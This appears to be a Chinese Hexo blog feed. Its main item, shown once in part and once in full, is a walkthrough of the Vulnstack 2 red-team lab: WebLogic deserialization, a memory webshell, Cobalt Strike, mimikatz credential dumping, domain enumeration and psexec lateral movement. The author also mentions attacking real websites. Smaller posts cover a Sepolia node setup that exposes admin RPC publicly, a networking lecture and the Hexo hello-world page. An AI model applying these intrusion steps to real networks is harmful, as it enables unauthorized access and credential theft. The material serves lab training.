title="内网渗透"></a>内网渗透</h3><p>直接ipconfig &#x2F;all 看到域de1ay.com，发现是双网卡，10.10.10.1&#x2F;24为内网的网段，意味着很有可能域控为10.10.10.10（域控一般就是dns的服务器）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fcf368d69b545bf284663f134c96014a.png"></p><p>net user &#x2F;domain 查看不了，说明不是域内账户（后面cs拿到域内账户再信息收集）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/cf24b50f6a7afcfcc9b4c0f4b8ee4441.png"></p><p>tasklist &#x2F;svc 查看有无杀软，提示360杀软（不慌，直接登上主机把你关掉）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/47438a8712305d1c902d3483d1cb8147.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7354bb5e2292283043c6a29068dcfae1.png"></p><p>冰歇上传并执行cs生成的exe，成功上线cs，可以看到权限是Administrator（并不是域内账号，所以需要抓取密码，登录域内再收集信息攻击对方）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/40ad0b9fffc1b55ef2a86d2876328807.png"></p><p>使用插件中的mimikatz模块抓取登录密码，获取口令</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4020d818d26cff88b95a035ed0b08d21.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7a44c483b2b159617febb32af1e3d433.png"></p><p>使用mssql该域账号进行登录，可以看到已经上线了域账号mssql，现在可以进行简单的内网信息收集</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23211239c150742e7784ba10311070f2.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/886e9b3b6ea3d51d59a9d1dd5be8dd81.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/dd59a93504ea5c7173e2cc9cc50f0a43.png"> </p><pre><code>net user /domain    #查询域内用户</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5aadb27d85616f0b81f2545c3d4ae890.png"></p><pre><code>net group &quot;domain admins&quot; /domain   #查看域管理员用户</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/2a4daf05f32ac482fc3ae829fe1955be.png"></p><pre><code>net group &quot;domain computers&quot; /domain     #查看域内主机</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9de34b4f9b156caec28f18d2ca0bd152.png"></p><pre><code>net group &quot;domain controllers&quot; /domain   #查看域控制器</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8289e9626ac55cc99bca9126ed769354.png"></p><pre><code>ping DC   #定位域控</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c027c608216104fbe23205d119304cc2.png"></p><pre><code>ping PC   #定位域内个人pc，对方开启防火墙导致无法ping通，但该ip已暴露</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/cbbcc66bc9d9217fae625a464da0b16a.png"></p><p>内网信息：域de1ay.com存在2台域内主机，分别为WEB（10.10.10.80）和PC（10.10.10.201），域控为DC（10.10.10.10），域管为administrator。</p><hr><p>先提权获取到system权限，成功上线</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1287bb6310db32ea822cbb459c0bc974.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f291339c939dcfe27f3c24661c4e8abd.png"> </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d2c88d39b905b3dce015c8ea0422e766.png"> </p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>使用cs扫描10.10.10.0&#x2F;24这个段，探测出域内DC跟PC。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/19c06710bef5c399655be5fa3d12c286.png"></p><p>也可以输入portscan扫描</p><pre><code>portscan 网段 端口 协议（icmp arp none）线程内网主机探活+端口扫描portscan 10.10.10.0/24 1-1024,3389,5000-6000 arp 1024 </code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1bff814604ab6afd2659278520e34aad.png"></p><h4 id="横向DC"><a href="#横向DC" class="headerlink" title="横向DC"></a>横向DC</h4><p>横向移动跳转到DC（10.10.10.10），这里使用psexec，用之前获取的域管密码作为登录DC的口令，新建一个smb监听器，监听域内主机WEB（10.10.10.80） 作为跳板机传回来的session（上线）会话。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b8810611d099d905bdd0334ce093accb.png"></p><p>选择已经获得的凭据（明文、散列值、令牌都可以）、回连的listener、进行横向的session。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f4f1dcffd60439f66379316cd22b37cd.png"> </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/3772523cdfb9267e6bb292ee77b08599.png"> </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4284d163603abf1fe8859848ce206339.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/1d99141223191bcf98e0eacd2a1d2f96.png"></p><h4 id="横向PC"><a href="#横向PC" class="headerlink" title="横向PC"></a>横向PC</h4><p>使用psexec_psh进行横向移动</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8e8285747e8a8c2d6404edcf64479b39.png"></p><p>选择已经获得的凭据（明文、散列值、令牌都可以）、回连的listener、进行横向的session。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6a563ebc1d33c23a3b846949327c687f.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/04351a9e0250d3e8f32280dfacd26bb0.png"></p><p>到这里所有域内主机都已经拿下了，可以说已经是拿下这个域</p><hr><p>总结：</p><p>权限维持：制作黄金票据的时候不知道为啥失败了，所以就没有展示</p><p>msf：使用msf打，感觉不太方便跟稳定，proxychain容易断开</p><p>CS相对来说会比较自动化方便，还是比较喜欢cs多一点，还没有进行免杀处理，这个后面是一定要学。</p><p>红日靶场二一直是我喜欢的一个靶场，所以就分享出来。</p><hr><p>在送给看到这里的各位家人们一句话：</p><p>一岁有一岁的味道，一站有一站的风景，花会沿途盛放，以后的路也是。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/ATT_CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C_%E8%83%8E%E5%84%BF%E6%95%99%E5%AD%A6_/"/>
      <url>/2025/07/15/ATT_CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%BA%8C_%E8%83%8E%E5%84%BF%E6%95%99%E5%AD%A6_/</url>
      
        <content type="html"><![CDATA[<h1 id="ATT-CK红队评估实战靶场二【胎儿教学】"><a href="#ATT-CK红队评估实战靶场二【胎儿教学】" class="headerlink" title="ATT&amp;CK红队评估实战靶场二【胎儿教学】"></a>ATT&amp;CK红队评估实战靶场二【胎儿教学】</h1><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6159ed73431fa89b2490280e68cddac2.jpeg"></p><p>给大家一个小建议，先打靶场练练手，再实战找目标打，因为实战是要快速完成的。我这里就是个例子，之前知道个大概，比较生手，一边打别人一边记录，打到一半别人就把网页关了。只能说太菜太慢。[手动狗头]</p><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><pre><code>下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</code></pre><p>直接点击下载</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a9f1eebe6c8cc0bf4357b5dd34a685fe.png"></p><p>新增VMnet2网卡</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/569ff32247fd18414357c2dc5763c812.png"></p><p><strong>web：</strong> 需要配置两张网卡，分别是外网出访NAT模式和内网域环境仅主机模式下的VMnet2网卡。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/df5a8bdc4ff9f0b08b9dc3ffdbe1e3d7.png"></p><p><strong>PC：</strong> 跟web一样，也是需要配置两张网卡，分别是外网出访NAT模式和内网域环境仅主机模式下的VMnet2网卡。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c3607b94eba6691a8322939194afde53.png"></p><p><strong>DC：</strong> 只是内网网段，所以只需配置仅主机模式</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/a213b7ee7a280f98b39345377d0e3d3f.png"></p><p>靶场的web和pc网关是192.168.111.1，我自己的网关设置是192.168.111.2，需要把外网nat网关改为.2。</p><p>账号：administrator</p><p>密码：1qaz@WSX</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/3d19c6e2fa3970c500a8f563e0cf93a4.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7fd589df9429b494edf42202b6182b68.png"></p><p>在web服务器上启动weblogic服务，用管理员权限administrator&#x2F;1qaz@WSX打开startweblogic。</p><p>路径C:\Oracle\Middleware\user_projects\domains\base_domain\bin</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90e3edcadc2e3d00e3835ac594b9b279.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b0e315af381edcedccf9c80ed315ca17.png"></p><p>浏览器访问<a href="http://192.168.111.80:7001，看到Error">http://192.168.111.80:7001，看到Error</a> 404即启动成功，靶场搭建完成。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/51b31910603b5bc7867044b3bff89655.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h3><p>看到7001端口，或者探测出来这个端口，有可能存在weblogic漏洞，那么直接上工具。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/bd231a2f5024a81e1e65798de826d0be.png"></p><p>使用工具探测出存在反序列化漏洞 </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6a8f1b993ea743d3c06cfd246be5b2b1.png"></p><p>推荐一款可以注入weblogic内存马的工具，因为是注入到中间件的内存中，当访问到该url就会触发内存马，链接webshell，隐蔽性较好。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ac0673a62f8b55f9a950e7877e50c1c8.png"></p><p>使用冰歇成功连接 </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d0b034c9e321995782ac09a6d0a96fc5.png"> 好了，那么外网打点已经成功啦，接下就是针对内网的信息收集与横向移动</p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>直接ipconfig &#x2F;all 看到域de1ay.com，发现是双网卡，10.10.10.1&#x2F;24为内网的网段，意味着很有可能域控为10.10.10.10（域控一般就是dns的服务器）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fcf368d69b545bf284663f134c96014a.png"></p><p>net user &#x2F;domain 查看不了，说明不是域内账户（后面cs拿到域内账户再信息收集）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/cf24b50f6a7afcfcc9b4c0f4b8ee4441.png"></p><p>tasklist &#x2F;svc 查看有无杀软，提示360杀软（不慌，直接登上主机把你关掉）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/47438a8712305d1c902d3483d1cb8147.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7354bb5e2292283043c6a29068dcfae1.png"></p><p>冰歇上传并执行cs生成的exe，成功上线cs，可以看到权限是Administrator（并不是域内账号，所以需要抓取密码，登录域内再收集信息攻击对方）</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/40ad0b9fffc1b55ef2a86d2876328807.png"></p><p>使用插件中的mimikatz模块抓取登录密码，获取口令</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4020d818d26cff88b95a035ed0b08d21.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7a44c483b2b159617febb32af1e3d433.png"></p><p>使用mssql该域账号进行登录，可以看到已经上线了域账号mssql，现在可以进行简单的内网信息收集</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23211239c150742e7784ba10311070f2.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/886e9b3b6ea3d51d59a9d1dd5be8dd81.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/dd59a93504ea5c7173e2cc9cc50f0a43.png"> </p><pre><code>net user /domain    #查询域内用户</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5aadb27d85616f0b81f2545c3d4ae890.png"></p><pre><code>net group &quot;domain admins&quot; /domain   #查看域管理员用户</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/2a4daf05f32ac482fc3ae829fe1955be.png"></p><pre><code>net group &quot;domain computers&quot; /domain     #查看域内主机</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9de34b4f9b156caec28f18d2ca0bd152.png"></p><pre><code>net group &quot;domain controllers&quot; /domain   #查看域控制器</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8289e9626ac55cc99bca9126ed769354.png"></p><pre><code>ping DC   #定位域控</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c027c608216104fbe23205d119304cc2.png"></p><pre><code>ping PC   #定位域内个人pc，对方开启防火墙导致无法ping通，但该ip已暴露</code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/cbbcc66bc9d9217fae625a464da0b16a.png"></p><p>内网信息：域de1ay.com存在2台域内主机，分别为WEB（10.10.10.80）和PC（10.10.10.201），域控为DC（10.10.10.10），域管为administrator。</p><hr><p>先提权获取到system权限，成功上线</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1287bb6310db32ea822cbb459c0bc974.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f291339c939dcfe27f3c24661c4e8abd.png"> </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d2c88d39b905b3dce015c8ea0422e766.png"> </p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>使用cs扫描10.10.10.0&#x2F;24这个段，探测出域内DC跟PC。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/19c06710bef5c399655be5fa3d12c286.png"></p><p>也可以输入portscan扫描</p><pre><code>portscan 网段 端口 协议（icmp arp none）线程内网主机探活+端口扫描portscan 10.10.10.0/24 1-1024,3389,5000-6000 arp 1024 </code></pre><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1bff814604ab6afd2659278520e34aad.png"></p><h4 id="横向DC"><a href="#横向DC" class="headerlink" title="横向DC"></a>横向DC</h4><p>横向移动跳转到DC（10.10.10.10），这里使用psexec，用之前获取的域管密码作为登录DC的口令，新建一个smb监听器，监听域内主机WEB（10.10.10.80） 作为跳板机传回来的session（上线）会话。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b8810611d099d905bdd0334ce093accb.png"></p><p>选择已经获得的凭据（明文、散列值、令牌都可以）、回连的listener、进行横向的session。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f4f1dcffd60439f66379316cd22b37cd.png"> </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/3772523cdfb9267e6bb292ee77b08599.png"> </p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4284d163603abf1fe8859848ce206339.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/1d99141223191bcf98e0eacd2a1d2f96.png"></p><h4 id="横向PC"><a href="#横向PC" class="headerlink" title="横向PC"></a>横向PC</h4><p>使用psexec_psh进行横向移动</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/8e8285747e8a8c2d6404edcf64479b39.png"></p><p>选择已经获得的凭据（明文、散列值、令牌都可以）、回连的listener、进行横向的session。</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6a563ebc1d33c23a3b846949327c687f.png"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/04351a9e0250d3e8f32280dfacd26bb0.png"></p><p>到这里所有域内主机都已经拿下了，可以说已经是拿下这个域</p><hr><p>总结：</p><p>权限维持：制作黄金票据的时候不知道为啥失败了，所以就没有展示</p><p>msf：使用msf打，感觉不太方便跟稳定，proxychain容易断开</p><p>CS相对来说会比较自动化方便，还是比较喜欢cs多一点，还没有进行免杀处理，这个后面是一定要学。</p><p>红日靶场二一直是我喜欢的一个靶场，所以就分享出来。</p><hr><p>在送给看到这里的各位家人们一句话：</p><p>一岁有一岁的味道，一站有一站的风景，花会沿途盛放，以后的路也是。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/sepolia%E6%B5%8B%E8%AF%95%E7%BD%91%E9%85%8D%E7%BD%AE1/"/>
      <url>/2025/07/15/sepolia%E6%B5%8B%E8%AF%95%E7%BD%91%E9%85%8D%E7%BD%AE1/</url>
      
        <content type="html"><![CDATA[<h3 id="sepolia测试网配置"><a href="#sepolia测试网配置" class="headerlink" title="sepolia测试网配置"></a>sepolia测试网配置</h3><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt dist-upgrade</span><br><span class="line">sudo apt install golang</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct //修改代理，国内编译go文件</span><br><span class="line">sudo apt-get install curl</span><br><span class="line">apt install wget git screen gcc automake autoconf libtool make unzip liblz4-tool aria2 vim </span><br></pre></td></tr></table></figure><p>官网上下载geth并解压</p><p><a href="https://geth.ethereum.org/downloads">Downloads | go-ethereum</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf filename.tar.gz</span><br></pre></td></tr></table></figure><p><strong>Lighthouse和Prysm都是以太坊的共识客户端</strong>（选其中一个用即可）</p><h4 id="下载lighthouse"><a href="#下载lighthouse" class="headerlink" title="下载lighthouse"></a>下载lighthouse</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/sigp/lighthouse/releases/download/v4.2.0/lighthouse-v4.2.0-x86_64-unknown-linux-gnu.tar.gz </span><br><span class="line">tar -zxvf lighthouse-v4.2.0-x86_64-unknown-linux-gnu.tar.gz </span><br><span class="line">rm -rf lighthouse-v4.2.0-x86_64-unknown-linux-gnu.tar.gz</span><br></pre></td></tr></table></figure><h4 id="下载prysm"><a href="#下载prysm" class="headerlink" title="下载prysm"></a>下载prysm</h4><p>创建文件夹目录如下</p><p>📂ethereum<br>┣ 📂consensus<br>┣ 📂execution</p><p>导航到目录consensus并运行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/prysmaticlabs/prysm/master/prysm.sh --output prysm.sh &amp;&amp; chmod +x prysm.sh</span><br></pre></td></tr></table></figure><h4 id="jwt秘钥生成"><a href="#jwt秘钥生成" class="headerlink" title="jwt秘钥生成"></a>jwt秘钥生成</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./prysm.sh beacon-chain generate-auth-secret</span><br><span class="line">或</span><br><span class="line">sudo mkdir -p /secrets</span><br><span class="line">openssl rand -hex 32 | tr -d &quot;\n&quot; | sudo tee /secrets/jwt.hex</span><br></pre></td></tr></table></figure><p>(参数根据具体jwt.hex所在位置填写)</p><h4 id="运行geth"><a href="#运行geth" class="headerlink" title="运行geth"></a>运行geth</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./geth --sepolia --http --http.api admin,eth,db,debug,net,web3 --http.port &quot;8344&quot; --ws --ws.port &quot;8345&quot; --ws.api &quot;db,eth,net,web3,personal,admin,shh,txpool,debug,miner&quot; --http.api &quot;db,eth,net,web3,personal,admin,shh,txpool,debug,miner&quot; --http.addr 0.0.0.0 --authrpc.jwtsecret=/ethereum/jwt.hex </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="运行prysm（可以选择输出在日志也可以输出在终端）"><a href="#运行prysm（可以选择输出在日志也可以输出在终端）" class="headerlink" title="运行prysm（可以选择输出在日志也可以输出在终端）"></a>运行prysm（可以选择输出在日志也可以输出在终端）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./prysm.sh beacon-chain --execution-endpoint=http://localhost:8551 --sepolia --jwt-secret=/ethereum/jwt.hex  --checkpoint-sync-url=https://sepolia.beaconstate.info --genesis-beacon-api-url=https://sepolia.beaconstate.info --accept-terms-of-use &gt; /ethereum/data/prysm/beacon.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="运行lighthouse"><a href="#运行lighthouse" class="headerlink" title="运行lighthouse"></a>运行lighthouse</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./lighthouse bn --network mainnet --execution-endpoint http://127.0.0.1:8551 --executio n-jwt /secrets/jwt.hex --checkpoint-sync-url https://sync-mainnet.beaconcha.in --disable-deposit-contract-sync --http</span><br></pre></td></tr></table></figure><p>检查同步状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:3500/eth/v1/node/syncing</span><br></pre></td></tr></table></figure><p>进入geth控制台并检查同步状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./geth attach /root/.ethereum/sepolia/geth.ipc</span><br><span class="line">eth.syncing</span><br></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /ethereum/data/prysm/beacon.log</span><br></pre></td></tr></table></figure><h4 id="火狐浏览器插件下载metamask"><a href="#火狐浏览器插件下载metamask" class="headerlink" title="火狐浏览器插件下载metamask"></a>火狐浏览器插件下载metamask</h4><p><strong>下载linux版clash科学上网</strong></p><p>创建用户</p><p><strong>切记</strong></p><p><strong>“助记词和密钥保存好”</strong></p><p>查看账户情况</p><p><a href="https://sepolia.etherscan.io/">https://sepolia.etherscan.io/</a></p><p>连接链子</p><p><a href="https://chainlist.org/?search=sepolia&testnets=true">https://chainlist.org/?search=sepolia&amp;testnets=true</a></p><p>左上角连接测试网络sepolia，即可交易</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/07/15/%E8%AE%B2%E8%AF%BE/"/>
      <url>/2025/07/15/%E8%AE%B2%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<p>linux防火墙和windows防火墙</p><p>linux防火墙指令</p><p>systemctl start firewalld</p><p>systemctl status firewalld</p><p>systemctl stop firewalld</p><p>netstat -lntup</p><p>web全称：World Wide Web，全球广域网，也称为万维网。<br>web项目分为如下架构：<br>C&#x2F;S架构：全称客户端服务端架构，英文Client&#x2F;Server。qq、微信、京东app、各种游戏app或者电脑游<br>戏应用等等。服务端主要负责加工处理数据，客户端主要用来展示数据。有些数据是存储在服务端的，<br>比如商品信息，我们换个电脑查看，商品信息还在，有些数据是存储在客户端的，比如聊天记录，我们<br>换个电脑在登录qq，如果不做同步，就没有聊天记录了。<br>B&#x2F;S架构：是C&#x2F;S架构的一种，只是单独拿出来说，浏览器&#x2F;服务端架构，英文Browser&#x2F;Server，京东网<br>站、淘宝网站等等，基于浏览器访问的网站都是B&#x2F;S架构。这种架构的网站非常多，因为成本也比较便<br>宜，不是每个公司都会开发自己的客户端程序，而且如果每个公司都制作自己客户端程序，我们的手机<br>或者电脑要安装很多的客户端，其实很难受，而浏览器就提供了一个统一的入口，我们只需要下载一个<br>浏览器软件，比如谷歌浏览器、火狐浏览器、360浏览器等等，只要打开一个标签页，输入一个网址就<br>能访问一个网站，那么相当于我们一个软件就访问了多个公司的网站，很方便，这就是统一入口的意<br>思。</p><p>web发展了几个阶段：<br>web 1.0阶段：纯静态页面，不能交互，只是用来展示一些内容给大家看。客户端页面使用的HTML语言<br>开发的。<br>web 2.0阶段：支持用户上传信息，交互，购物。服务端后台开发语言有：php、java、ruby、python<br>等 ，刚开始使用后端开发语言就是为了用它来生成动态页面的，比如一些动态数据的展示等。php、<br>java是早先用的最多的。<br>web 3.0阶段：移动互联网，衣食住行，出门只带个手机就行。服务端后台开发语言有：php、java、<br>ruby、python等</p><p>超文本传输协议 （Hyper Text Transfer Protocol，HTTP），1990年问世，发明者是蒂姆-伯纳斯-李。<br>1991年linux内核才发布出来，也是因为有互联网才让linux迅速传播开来。1994年Intel的奔腾处理器才<br>刚开始发布。</p><p><strong>六、ip地址划分</strong><br>ip地址：实际上是32位二进制数（01100100.00000100.00000101.00000110）<br>a类 1.0.0.1<del>126.255.255.254<br>第一组：1-126开头的地址是A类<br>0&lt;A类&lt;127 128<br>b类 128.0.0.1</del>191.255.255.254<br>128&lt;&#x3D;B类&lt;192 64<br>c类 192.0.0.1<del>223.255.255.254 32<br>d类 组播,VRRP协议，keepalive高可用 224 ~239<br>e类 科研 240-255<br>私有ip地址范围：<br>局域网地址:<br>A 10.0.0.0</del>10.255.255.255<br>B 172.16.0.0<del>172.31.255.255<br>C 192.168.0.0</del>192.168.255.255<br>为了缓解ipv4地址不够用的问题 32位 128位<br>1：ipv6 fe80::2e60:cff:fe9c:a4b3<br>2: NAT network address transformation 网络地址转换<br>好处：<br>a:节约大量的公网ip地址<br>b：减少了网络攻击</p><p><strong>八、dns解析流程</strong><br>dns：domain name system域名系统<br>作用：将域名解析成ip地址</p><p><strong>九、arp协议</strong><br>arp 数据链路层<br>ARP（Address Resolution Protocol）<br>把ip地址解析成mac地址<br>arp要注意的<br>a：arp欺骗<br>b：如果局域网规模太大，广播风暴</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/07/15/hello-world/"/>
      <url>/2025/07/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
